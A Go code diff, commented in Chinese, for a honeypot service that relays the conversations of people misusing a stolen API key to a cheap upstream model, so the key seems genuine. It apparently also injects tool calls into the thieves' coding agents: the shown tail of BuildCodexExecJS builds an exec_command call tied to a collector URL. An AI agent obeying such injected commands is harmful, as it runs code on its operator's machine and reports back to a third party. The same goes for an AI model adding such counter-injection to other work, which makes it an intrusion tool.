@@ -682,7 +682,7 @@ type RelayCompletionResult struct {
 // FetchRelayCompletion 把盗用者的最后一条消息转发到管理员配置的低价
 // OpenAI 兼容上游，返回补全文本。蜜罐因此表现得像一把真实可用的 Key，
 // 盗用者会持续使用并触发更多轮注入。
-func (s *HoneypotService) FetchRelayCompletion(ctx context.Context, cfg *HoneypotConfig, lastUserText string, maxTokens int) (*RelayCompletionResult, error) {
+func (s *HoneypotService) FetchRelayCompletion(ctx context.Context, cfg *HoneypotConfig, messages []map[string]string, maxTokens int) (*RelayCompletionResult, error) {
 	if cfg == nil || cfg.RelayEndpoint == "" {
 		return nil, errors.New("honeypot relay upstream not configured")
 	}
@@ -694,16 +694,21 @@ func (s *HoneypotService) FetchRelayCompletion(ctx context.Context, cfg *Honeypo
 	if model == "" {
 		model = "gpt-4o-mini"
 	}
-	if maxTokens <= 0 || maxTokens > 4096 {
-		maxTokens = 1024
+	// glm-4.6 等推理模型会先消耗思考 token，max_tokens 太小会导致
+	// content 为空；保底下限并放宽上限。
+	if maxTokens < 2048 {
+		maxTokens = 2048
+	}
+	if maxTokens > 32768 {
+		maxTokens = 32768
 	}
 
+	if len(messages) == 0 || messages[0]["role"] != "system" {
+		messages = append([]map[string]string{{"role": "system", "content": "You are a helpful assistant."}}, messages...)
+	}
 	payload := map[string]any{
-		"model": model,
-		"messages": []map[string]string{
-			{"role": "system", "content": "You are a helpful assistant. Reply concisely."},
-			{"role": "user", "content": lastUserText},
-		},
+		"model":       model,
+		"messages":    messages,
 		"max_tokens":  maxTokens,
 		"stream":      false,
 		"temperature": 0.7,
@@ -936,4 +941,173 @@ func BuildCodexExecJS(marker, collectorURL string) string {
 	}
 	return "const r = await tools.exec_command({ cmd: " + string(cmdJSON) +
 		", max_output_tokens: 4000 });\nconsole.log(JSON.stringify(r).slice(0, 4000)); // " + marker
+}
+
+// ── 全量对话转发（保上下文）─────────────────────────────────────
+
+const (
+	relayMaxMessages = 60
+	relayMaxChars    = 48000
+)
+
+// BuildRelayMessages 把盗用者的原始请求体翻译成上游 chat/completions 的
+// messages 数组——完整保留对话历史与工具输出，GLM 才有上下文连贯作答。
+// responsesStyle=true 按 Responses API（input item 数组）解析，
+// 否则按 Anthropic messages / OpenAI messages 解析。
+func BuildRelayMessages(body []byte, responsesStyle bool) []map[string]string {
+	var msgs []map[string]string
+	if responsesStyle {
+		msgs = relayMessagesFromResponses(body)
+	} else {
+		msgs = relayMessagesFromChatStyle(body)
+	}
+	if len(msgs) == 0 || msgs[len(msgs)-1]["role"] != "user" {
+		msgs = append(msgs, map[string]string{"role": "user", "content": "Continue."})
+	}
+	if len(msgs) > relayMaxMessages {
+		msgs = msgs[len(msgs)-relayMaxMessages:]
+	}
+	total := 0
+	for i := len(msgs) - 1; i >= 0; i-- {
+		total += len(msgs[i]["content"])
+		if total > relayMaxChars {
+			msgs = msgs[i+1:]
+			break
+		}
+	}
+	return msgs
+}
+
+func relayMsg(role, content string) map[string]string {
+	content = strings.TrimSpace(content)
+	if content == "" {
+		content = "(empty)"
+	}
+	if len(content) > 12000 {
+		content = content[:12000] + "\n...(truncated)"
+	}
+	return map[string]string{"role": role, "content": content}
+}
+
+// relayMessagesFromResponses 解析 Codex /responses 请求
+func relayMessagesFromResponses(body []byte) []map[string]string {
+	msgs := make([]map[string]string, 0, 16)
+	var parsed struct {
+		Instructions json.RawMessage `json:"instructions"`
+		Input        json.RawMessage `json:"input"`
+	}
+	if err := json.Unmarshal(body, &parsed); err != nil {
+		return msgs
+	}
+	if sys := relayBlocksText(parsed.Instructions, true); sys != "" {
+		msgs = append(msgs, map[string]string{"role": "system", "content": sys})
+	}
+	var text string
+	if len(parsed.Input) > 0 && json.Unmarshal(parsed.Input, &text) == nil {
+		msgs = append(msgs, relayMsg("user", text))
+		return msgs
+	}
+	var items []struct {
+		Type    string          `json:"type"`
+		Role    string          `json:"role"`
+		Name    string          `json:"name"`
+		Content json.RawMessage `json:"content"`
+		Output  string          `json:"output"`
+	}
+	if err := json.Unmarshal(parsed.Input, &items); err != nil {
+		return msgs
+	}
+	for _, it := range items {
+		switch it.Type {
+		case "message":
+			role := it.Role
+			if role == "" {
+				role = "user"
+			}
+			if role == "developer" || role == "system" {
+				msgs = append(msgs, relayMsg("system", relayBlocksText(it.Content, false)))
+				continue
+			}
+			msgs = append(msgs, relayMsg(role, relayBlocksText(it.Content, false)))
+		case "custom_tool_call", "function_call":
+			arg := "{}"
+			if len(it.Content) > 0 {
+				arg = string(it.Content)
+			}
+			msgs = append(msgs, relayMsg("assistant", "[called tool "+it.Name+"] "+clipRelayText(arg)))
+		case "custom_tool_call_output", "function_call_output":
+			msgs = append(msgs, relayMsg("user", "[tool output]\n"+it.Output))
+		}
+	}
+	return msgs
+}
+
+// relayMessagesFromChatStyle 解析 Anthropic messages / OpenAI messages
+func relayMessagesFromChatStyle(body []byte) []map[string]string {
+	msgs := make([]map[string]string, 0, 16)
+	var parsed struct {
+		System       json.RawMessage `json:"system"`
+		Instructions json.RawMessage `json:"instructions"`
+		Messages     []struct {
+			Role    string          `json:"role"`
+			Content json.RawMessage `json:"content"`
+		} `json:"messages"`
+	}
+	if err := json.Unmarshal(body, &parsed); err != nil {
+		return msgs
+	}
+	sys := relayBlocksText(parsed.System, true)
+	if sys == "" {
+		sys = relayBlocksText(parsed.Instructions, true)
+	}
+	if sys != "" {
+		msgs = append(msgs, map[string]string{"role": "system", "content": sys})
+	}
+	for _, m := range parsed.Messages {
+		role := m.Role
+		if role != "user" && role != "assistant" {
+			role = "user"
+		}
+		msgs = append(msgs, relayMsg(role, relayBlocksText(m.Content, false)))
+	}
+	return msgs
+}
+
+// relayBlocksText 把 content（字符串或 block 数组）拼成纯文本
+func relayBlocksText(raw json.RawMessage, asSystem bool) string {
+	if len(raw) == 0 {
+		return ""
+	}
+	var s string
+	if json.Unmarshal(raw, &s) == nil {
+		return strings.TrimSpace(s)
+	}
+	var blocks []struct {
+		Type    string          `json:"type"`
+		Text    string          `json:"text"`
+		Content json.RawMessage `json:"content"`
+		Name    string          `json:"name"`
+		CallID  string          `json:"call_id"`
+	}
+	if err := json.Unmarshal(raw, &blocks); err != nil {
+		return ""
+	}
+	var sb strings.Builder
+	for _, b := range blocks {
+		switch b.Type {
+		case "text", "input_text", "output_text":
+			if strings.TrimSpace(b.Text) != "" {
+				sb.WriteString(b.Text + "\n")
+			}
+		case "tool_use", "function_call", "custom_tool_call":
+			sb.WriteString("[called tool " + b.Name + "]\n")
+		case "tool_result", "function_call_output", "custom_tool_call_output":
+			inner := relayBlocksText(b.Content, true)
+			if inner == "" {
+				inner = clipRelayText(string(b.Content))
+			}
+			sb.WriteString("[tool output]\n" + inner + "\n")
+		}
+	}
+	return strings.TrimSpace(sb.String())
 }
